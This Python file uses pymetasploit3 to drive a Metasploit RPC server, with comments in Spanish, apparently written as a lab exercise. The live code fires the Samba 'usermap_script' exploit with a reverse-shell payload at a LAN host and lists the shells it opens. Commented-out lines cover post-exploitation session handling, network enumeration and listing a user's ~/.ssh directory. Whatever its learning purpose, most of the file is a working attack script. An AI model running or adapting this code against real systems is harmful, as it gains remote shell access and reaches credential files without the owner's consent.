from pymetasploit3.msfrpc import *


# client = MsfRpcClient('backindoor')
client = MsfRpcClient('backindoor', port=55553, ssl=True)
# client = MsfRpcClient('backindoor', port=55552, ssl=False)
# client = MsfRpcClient('WsNFyWBa', port=55552, ssl=False)


# client.modules.post

# print(client.modules.post)

# module = client.modules.use('post', 'linux/gather/enum_network')

# Todas las opciones del modulo
# print(module.options)

# Opciones requeridas
# print(module.missing_required)
# Cambiar opcion
# module['SESSION'] = 1
# Opciones actuales
# print(module.runoptions)

# Crear consola
# console_id = client.consoles.console().cid
# Referencia a consola
# console = client.consoles.console(console_id)
# Ejecutar modulo
# print(console.run_module_with_output(module))

# Crear sesion
# session = client.sessions.session('3')
# print(session.gather_output())
# La sesion se crea como resultado de la ejecucion de un modulo que devuelva meterpreter

# print(module.execute())

# Sesiones activas
# keys = list(client.sessions.list.keys())
# print(keys)
# print(client.sessions.list['1'])


# print(client.modules.exploits)
module = client.modules.use('exploit', 'multi/samba/usermap_script')
payload = client.modules.use('payload', 'cmd/unix/reverse')
print(module.missing_required)
module['RHOSTS'] = '192.168.1.43'
# module['RPORT'] = '445'
# print(module.runoptions)
# print(module.options)
# print(module.optioninfo)
# Listar payloads disponibles
# print(module.targetpayloads())
ss = module.execute()
print(ss)
print(client.sessions.list)


# Crear consola
# console_id = client.consoles.console().cid
# Referencia a consola
# console = client.consoles.console(console_id)

# Ejecutar modulo
# print(console.run_module_with_output(module, payload='cmd/unix/reverse'))
# print(console.run_module_with_output(module))

# Escribir en consola
# console.write('ls ${HOME}/.ssh')
# out_split = console.read()['data'].split('Metasploit Documentation: https://docs.metasploit.com/')
# if len(out_split) > 1:
#     out = str(out_split[1:])[6:-4].split('\\n')
#     out[out.index('config')] = None
#     out.remove(None)
#     print(out)



# print(module.execute())
# print(client.sessions.list)